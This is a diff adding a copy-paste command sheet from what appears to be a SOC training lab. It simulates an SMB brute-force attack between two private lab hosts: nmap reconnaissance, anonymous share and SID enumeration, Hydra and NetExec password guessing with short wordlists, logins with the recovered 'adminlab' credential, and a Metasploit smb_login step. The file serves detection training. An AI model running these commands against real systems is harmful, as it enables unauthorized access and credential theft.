@@ -1,0 +1,47 @@
+# Kali commands — SOC-Case-Brute-Force (192.168.100.107 -> 192.168.100.108)
+# Copy-paste in order. See 02-Attack-Simulation.md for explanations.
+
+# --- Prep (once) ---
+sudo apt install -y hydra netexec nmap smbclient impacket-scripts
+cat > ~/users.txt <<'EOF'
+jdoe
+mreyes
+adminlab
+administrator
+guest
+EOF
+cat > ~/pass.txt <<'EOF'
+123456
+password
+Password1
+qwerty
+letmein
+rockyou
+Winter2024!
+P@ssw0rd
+EOF
+
+# --- Step 1: recon ---
+nmap -sS -sV -p 139,445,5985,3389 192.168.100.108
+
+# --- Step 2: SMB enumeration ---
+netexec smb 192.168.100.108 -u '' -p '' --shares
+smbclient -L //192.168.100.108 -U guest%
+impacket-lookupsid guest@192.168.100.108
+
+# --- Step 3: Hydra SMB brute force ---
+hydra -L ~/users.txt -P ~/pass.txt smb://192.168.100.108 -t 4 -vV
+
+# --- Step 4: NetExec SMB brute force ---
+netexec smb 192.168.100.108 -u ~/users.txt -p ~/pass.txt --continue-on-success
+
+# --- Step 5: verify access with stolen cred ---
+netexec smb 192.168.100.108 -u adminlab -p 'P@ssw0rd'
+smbclient -L //192.168.100.108 -U adminlab%P@ssw0rd
+impacket-smbclient adminlab:'P@ssw0rd'@192.168.100.108
+
+# --- Step 6 (optional): Metasploit ---
+# use auxiliary/scanner/smb/smb_login ; set RHOSTS 192.168.100.108 ; set USER_FILE ~/users.txt ; set PASS_FILE ~/pass.txt ; run
+
+# --- Record attack start/end time for 06-Timeline.md ---
+date
